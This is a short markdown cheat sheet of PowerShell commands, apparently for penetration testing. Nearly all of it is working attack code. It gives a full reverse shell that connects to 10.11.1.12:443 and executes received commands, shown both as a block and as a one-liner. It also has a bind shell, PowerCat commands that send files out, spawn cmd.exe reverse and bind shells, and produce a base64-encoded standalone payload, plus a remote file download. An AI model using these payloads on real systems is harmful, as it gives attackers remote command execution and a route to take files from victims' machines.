# Powershell Commands  

Useful powershell commands.  

### Environment.  

To change powershell execution policy.  

`Set-ExecutionPolicy Unrestricted`  

To find execution policy.  

`Get-ExecutionPolicy`  

### File Transfer.  

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.11.1.12','c:\Users\Bob\Desktop')"`  

### Reverse Shell.  

```
$client = New-Object System.Net.Sockets.TCPClient('10.11.1.12',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte, 0, $sendbyte.Length);
  $stream.Flush();
}
$client.Close();
```  

In one line.  

`$client = New-Object System.Net.Sockets.TCPClient('10.11.1.12',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush();}$client.Close();`

### Bind Shell.  

```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```  

### PowerCat.  

Load functions from a script into a powershell instance.  

`. .\powercat.ps1`  

File transfer.  

`powercat -c 10.11.1.4 -p 443 -i c:\Users\Bob\file.txt`  

Send a reverse shell to a listener.  

`powercat -c 10.11.1.23 -p 443 -e cmd.exe`  

Bind shell with a powercat listener.  

`powercat -l -p 443 -e cmd.exe`  

Standalone reverse shell payload base 64 encoded.  

`powercat -c 10.11.1.23 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1`  

Running an encoded string.  

`powershell.exe -E <base64 encoded string here>`  


